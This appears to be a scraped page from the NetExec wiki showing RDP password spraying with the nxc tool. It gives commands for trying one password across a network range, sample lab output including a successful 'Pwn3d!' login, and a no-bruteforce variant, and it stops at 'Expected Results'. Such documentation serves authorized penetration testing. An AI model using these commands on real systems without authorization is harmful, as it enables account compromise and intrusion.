{"title": "Password Spraying", "source": "netexec", "source_label": "NetExec Wiki", "path": "rdp-protocol/password-spraying", "html": "<hr />\n<h2 id=\"description-rdp-password-spraying-using-netexec\">description: RDP password spraying using NetExec</h2>\n<h1 id=\"password-spraying\">Password spraying</h1>\n<h4 id=\"password-spraying_1\">Password spraying</h4>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>rdp<span class=\"w\"> </span>&lt;CIDR&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>&lt;USERNAME&gt;<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;\n</code></pre></div>\n<pre><code class=\"language-bash\">nxc rdp &lt;TARGET&gt; -u rubeus -p October2021</code></pre>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>rdp<span class=\"w\"> </span>&lt;TARGET&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>ron<span class=\"w\"> </span>-p<span class=\"w\"> </span>October2021\nRDP<span class=\"w\">         </span><span class=\"m\">192</span>.168.133.157<span class=\"w\"> </span><span class=\"m\">3389</span><span class=\"w\">   </span>DC01<span class=\"w\">             </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\"> </span>Windows<span class=\"w\"> </span><span class=\"m\">10</span><span class=\"w\"> </span>or<span class=\"w\"> </span>Windows<span class=\"w\"> </span>Server<span class=\"w\"> </span><span class=\"m\">2016</span><span class=\"w\"> </span>Build<span class=\"w\"> </span><span class=\"m\">17763</span><span class=\"w\"> </span><span class=\"o\">(</span>name:DC01<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"o\">(</span>domain:poudlard.wizard<span class=\"o\">)</span>\nRDP<span class=\"w\">         </span><span class=\"m\">192</span>.168.133.157<span class=\"w\"> </span><span class=\"m\">3389</span><span class=\"w\">   </span>DC01<span class=\"w\">             </span><span class=\"o\">[</span>-<span class=\"o\">]</span><span class=\"w\"> </span>poudlard.wizard<span class=\"se\">\\r</span>on:October2021<span class=\"w\"> </span>\n\n$<span class=\"w\"> </span>nxc<span class=\"w\"> </span>rdp<span class=\"w\"> </span>&lt;TARGET&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>rubeus<span class=\"w\"> </span>-p<span class=\"w\"> </span>October2021\nRDP<span class=\"w\">         </span><span class=\"m\">192</span>.168.133.157<span class=\"w\"> </span><span class=\"m\">3389</span><span class=\"w\">   </span>DC01<span class=\"w\">             </span><span class=\"o\">[</span>*<span class=\"o\">]</span><span class=\"w\"> </span>Windows<span class=\"w\"> </span><span class=\"m\">10</span><span class=\"w\"> </span>or<span class=\"w\"> </span>Windows<span class=\"w\"> </span>Server<span class=\"w\"> </span><span class=\"m\">2016</span><span class=\"w\"> </span>Build<span class=\"w\"> </span><span class=\"m\">17763</span><span class=\"w\"> </span><span class=\"o\">(</span>name:DC01<span class=\"o\">)</span><span class=\"w\"> </span><span class=\"o\">(</span>domain:poudlard.wizard<span class=\"o\">)</span>\nRDP<span class=\"w\">         </span><span class=\"m\">192</span>.168.133.157<span class=\"w\"> </span><span class=\"m\">3389</span><span class=\"w\">   </span>DC01<span class=\"w\">             </span><span class=\"o\">[</span>+<span class=\"o\">]</span><span class=\"w\"> </span>poudlard.wizard<span class=\"se\">\\r</span>ubeus:October2021<span class=\"w\"> </span><span class=\"o\">(</span>Pwn3d!<span class=\"o\">)</span>\n</code></pre></div>\n<h4 id=\"password-spraying-without-bruteforce\">Password spraying (without bruteforce)</h4>\n<div class=\"highlight\"><pre><span></span><code>nxc<span class=\"w\"> </span>rdp<span class=\"w\"> </span>&lt;CIDR&gt;<span class=\"w\"> </span>-u<span class=\"w\"> </span>userfile<span class=\"w\"> </span>-p<span class=\"w\"> </span>&lt;PASSWORD&gt;file<span class=\"w\"> </span>--no-bruteforce\n</code></pre></div>\n<p>Expected Results:</p>\